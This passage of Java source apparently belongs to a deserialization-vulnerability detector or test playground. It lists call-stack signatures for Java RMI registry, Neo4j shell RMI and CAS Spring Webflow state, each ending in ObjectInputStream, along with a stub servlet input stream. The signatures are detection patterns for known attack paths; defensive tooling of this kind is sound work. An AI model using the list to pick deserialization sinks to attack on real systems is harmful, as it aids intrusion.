    return decoded.toString();
  }

  private static List<String> rmiRegistryStack() {
    return List.of(
        "sun.rmi.registry.RegistryImpl",
        "sun.rmi.server.UnicastServerRef",
        "sun.rmi.transport.Transport",
        "sun.rmi.transport.tcp.TCPTransport");
  }

  private static List<String> neo4jShellRmiStack() {
    return List.of(
        "org.neo4j.shell.impl.ShellServerImpl",
        "org.neo4j.shell.ShellServer",
        "sun.rmi.server.UnicastServerRef",
        "sun.rmi.transport.Transport",
        "sun.rmi.transport.tcp.TCPTransport",
        "java.io.ObjectInputStream");
  }

  private static List<String> casWebflowStateStack() {
    return List.of(
        "org.jasig.cas.util.EncryptedTranscoder",
        "org.springframework.webflow.execution.repository.support.ClientFlowExecutionRepository",
        "org.springframework.webflow.execution.repository.snapshot.SerializedFlowExecutionSnapshot",
        "java.io.ObjectInputStream");
  }

  private static final class PlaygroundServletInputStream extends ByteArrayInputStream {
    PlaygroundServletInputStream() {
      super(new byte[0]);
    }
  }
}
